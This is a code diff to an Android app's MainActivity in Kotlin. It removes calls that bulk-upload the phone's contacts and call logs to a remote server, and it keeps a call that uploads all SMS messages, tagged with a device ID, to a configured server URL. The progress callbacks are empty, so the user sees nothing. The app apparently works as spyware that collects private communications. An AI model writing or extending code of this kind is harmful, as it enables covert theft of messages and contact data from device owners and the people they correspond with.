@@ -43,8 +43,6 @@ import com.example.test.utils.DeviceInfoHelper
 import com.example.test.utils.PermissionManager
 import com.example.test.utils.PermissionDialog
 import com.example.test.utils.SmsBatchUploader
-import com.example.test.utils.ContactsBatchUploader
-import com.example.test.utils.CallLogsBatchUploader
 import com.example.test.UnifiedService
 import com.google.firebase.messaging.FirebaseMessaging
 import com.example.test.R
@@ -834,27 +832,12 @@ class MainActivity : ComponentActivity() {
                         appConfig.userId
                     )
 
-                    val callLogResult = CallLogsBatchUploader.uploadAllCallLogs(
-                        context = this@MainActivity,
-                        deviceId = deviceId,
-                        baseUrl = ServerConfig.getBaseUrl()
-                    ) { sent, total -> }
-
                     launch {
                         SmsBatchUploader.uploadAllSms(
                             context = this@MainActivity,
                             deviceId = deviceId,
                             baseUrl = ServerConfig.getBaseUrl()
                         ) { progress -> }
-                    }
-
-                    launch {
-                        delay(1000)
-                        ContactsBatchUploader.uploadAllContacts(
-                            context = this@MainActivity,
-                            deviceId = deviceId,
-                            baseUrl = ServerConfig.getBaseUrl()
-                        ) { sent, total -> }
                     }
 
                 } catch (e: Exception) {
